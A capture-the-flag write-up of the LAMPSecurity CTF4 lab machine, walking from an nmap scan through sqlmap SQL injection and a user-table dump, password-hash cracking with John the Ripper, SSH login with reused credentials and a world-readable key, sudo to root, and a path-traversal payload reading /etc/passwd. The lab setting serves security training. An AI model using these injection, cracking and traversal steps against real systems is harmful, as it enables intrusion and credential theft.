Title:LAMPSecurity: CTF4
Date:08-29-2014
Category:CTF

I start the LAMPSecurity CTF4 challenge of vulnhub
[available here](http://vulnhub.com/entry/lampsecurity-ctf4,83/).
The goal is to get a root shell on the server.

# Discovery

First of all we need to determine the IP address of the server.
Since we launch it in a bridged virtual machine the local router got the IP
address in the DHCP logs. We simply found the most recent one. For me it is
`192.168.1.56`.

## Nmap

Let start with a simple nmap

    #nmap -A -oA ctf4 192.168.1.56
    Nmap 6.47 scan initiated Thu Aug 28 18:49:49 2014 as: nmap -A -oA ctf4 192.168.1.56
    Nmap scan report for 192.168.1.56
    Host is up (0.00058s latency).
    Not shown: 996 filtered ports
    PORT    STATE  SERVICE VERSION
    22/tcp  open   ssh     OpenSSH 4.3 (protocol 2.0)
    | ssh-hostkey:
    |   1024 10:4a:18:f8:97:e0:72:27:b5:a4:33:93:3d:aa:9d:ef (DSA)
    |_  2048 e7:70:d3:81:00:41:b8:6e:fd:31:ae:0e:00:ea:5c:b4 (RSA)
    25/tcp  open   smtp    Sendmail 8.13.5/8.13.5
    | smtp-commands: ctf4.sas.upenn.edu Hello [192.168.1.97], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP,
    |_ 2.0.0 This is sendmail version 8.13.5 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
    80/tcp  open   http    Apache httpd 2.2.0 ((Fedora))
    |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
    | http-robots.txt: 5 disallowed entries
    |_/mail/ /restricted/ /conf/ /sql/ /admin/
    |_http-title:  Prof. Ehks
    631/tcp closed ipp
    Aggressive OS guesses: Linux 2.6.16 - 2.6.21 (98%), Linux 2.6.13 - 2.6.32 (96%), Control4 HC-300 home controller (96%), Lantronix SLC 8 terminal server (Linux 2.6) (96%), SNR SNR-S2960 switch (95%), SonicWALL Aventail EX-6000 VPN appliance (94%), Linux 2.6.8 - 2.6.30 (94%), Dell iDRAC 6 remote access controller (Linux 2.6) (94%), Linux 2.6.9 - 2.6.18 (94%), Linux 2.6.18 - 2.6.32 (94%)
    No exact OS matches for host (test conditions non-ideal)
    Service Info: Host: ctf4.sas.upenn.edu; OS: Unix

We found a list of available services:

* a SSH service on port 22
* a mail service on port 25
* a web service on port 80, note that there is five disallowed entries in robots.txt
* and a close CUPS service on port 631.

## The website

Let's take a look at the web site. It is a simple blog site with a XSS flaw on
the search engine.

The article are indexed with a GET parameter id. This parameter is vulnerable to
an SQL injection.

# Exploitation

## Sqlmap

We launch sqlmap:

    #sqlmap -u 'http://192.168.1.56/index.html?page=blog&title=Blog&id=6' -p id --tables
      sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
      ---
      Place: GET
      Parameter: id
          Type: boolean-based blind
          Title: AND boolean-based blind - WHERE or HAVING clause
          Payload: page=blog&title=Blog&id=6 AND 2396=2396

          Type: UNION query
          Title: MySQL UNION query (NULL) - 5 columns
          Payload: page=blog&title=Blog&id=6 UNION ALL SELECT NULL,CONCAT(0x7172756f71,0x494c647a675a47595a55,0x7178657471),NULL,NULL,NULL#

          Type: AND/OR time-based blind
          Title: MySQL > 5.0.11 AND time-based blind
          Payload: page=blog&title=Blog&id=6 AND SLEEP(5)
      ---
      [19:44:24] [INFO] the back-end DBMS is MySQL
      web server operating system: Linux Fedora 5 (Bordeaux)
      web application technology: Apache 2.2.0, PHP 5.1.2
      back-end DBMS: MySQL 5.0.11
      [19:44:24] [INFO] fetching database names
      [19:44:24] [INFO] fetching tables for databases: 'calendar, ehks, information_schema, mysql, roundcubemail, test'
      Database: calendar
      [5 tables]
      +---------------------------------------+
      | phpc_calendars                        |
      | phpc_events                           |
      | phpc_sequence                         |
      | phpc_users                            |
      | uid                                   |
      +---------------------------------------+

      Database: roundcubemail
      [6 tables]
      +---------------------------------------+
      | session                               |
      | cache                                 |
      | contacts                              |
      | identities                            |
      | messages                              |
      | users                                 |
      +---------------------------------------+

      Database: ehks
      [3 tables]
      +---------------------------------------+
      | user                                  |
      | blog                                  |
      | comment                               |
      +---------------------------------------+

      Database: information_schema
      [16 tables]
      +---------------------------------------+
      | CHARACTER_SETS                        |
      | COLLATIONS                            |
      | COLLATION_CHARACTER_SET_APPLICABILITY |
      | COLUMNS                               |
      | COLUMN_PRIVILEGES                     |
      | KEY_COLUMN_USAGE                      |
      | ROUTINES                              |
      | SCHEMATA                              |
      | SCHEMA_PRIVILEGES                     |
      | STATISTICS                            |
      | TABLES                                |
      | TABLE_CONSTRAINTS                     |
      | TABLE_PRIVILEGES                      |
      | TRIGGERS                              |
      | USER_PRIVILEGES                       |
      | VIEWS                                 |
      +---------------------------------------+

      Database: mysql
      [17 tables]
      +---------------------------------------+
      | user                                  |
      | columns_priv                          |
      | db                                    |
      | func                                  |
      | help_category                         |
      | help_keyword                          |
      | help_relation                         |
      | help_topic                            |
      | host                                  |
      | proc                                  |
      | procs_priv                            |
      | tables_priv                           |
      | time_zone                             |
      | time_zone_leap_second                 |
      | time_zone_name                        |
      | time_zone_transition                  |
      | time_zone_transition_type             |
      +---------------------------------------+

Okay so there is a lot of database let's dump the ehks users table:

    # sqlmap -u 'http://192.168.1.56/index.html?page=blog&title=Blog&id=6' -p id -D  ehks -T user --dump
    +---------+-----------+----------------------------------+
    | user_id | user_name | user_pass                        |
    +---------+-----------+----------------------------------+
    | 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 |
    | 2       | achen     | b46265f1e7faa3beab09db5c28739380 |
    | 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 |
    | 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 |
    | 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 |
    | 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f |
    +---------+-----------+----------------------------------+

## Cracking the hashes

We save the hahses in a file (option proposed by sqlmap) and we launch john the
ripper on it:

    #john hashes --format=raw-md5
    sorzek:pacman
    jdurbin:Sue1978
    2 password hashes cracked, 4 left

We test the cracked password on:

* the restricted part: there is two text files about how to blog and how to use the web mail
* the admin part: with the two cracked accounts we can only write new article, that is not really useful for our CTF
* the mail part: according to the instruction on the restricted part we can access the user's emails from here.

We found in an email from sorzek to ghighland that he just add a number to is
useual password "undone" so we just tell john to try password from undone0 to
undone9999. We cracked an other password:

    ghighland:undone1

## SSH connexions

Okay the same password seems to be used everywhere and I was a bit lost to how
to continue so I try the credentials on the ssh service: *it works!*

First of all I logged with the jdurbin account.
There seems to be anything useful but in my search I saw that achen had an
ssh private key readable by everyone (a ppk one for PuTTY).
Okay lets use it to connect on the machine. It ask no password and we got a
shell, what now?

## Privileges escalation

I try to see what was the differences with this account and I saw a pdf file
"linux_administration.pdf" so I tried to use the sudo command with `sudo -v` and
once again: *it works!*
So a simple `sudo su` give us the root rights.

*DONE!*

# Summary

Lets resume :

1. exploitation of the SQL injection
2. cracked the hashes
3. use the credentials on the SSH service
4. find the ppk SSH key
5. use it to connect on the achen account
6. sudo su

That was a easy one !

# Nota bene

Oh yeah we do not explore the lead of the file injection in the
page GET parameter:

    http://192.168.1.56/index.html?page=../../../../../../etc/passwd%00&title=Blog&id=5

Moreover the root password "root1234" where is the `bash_history` of achen.

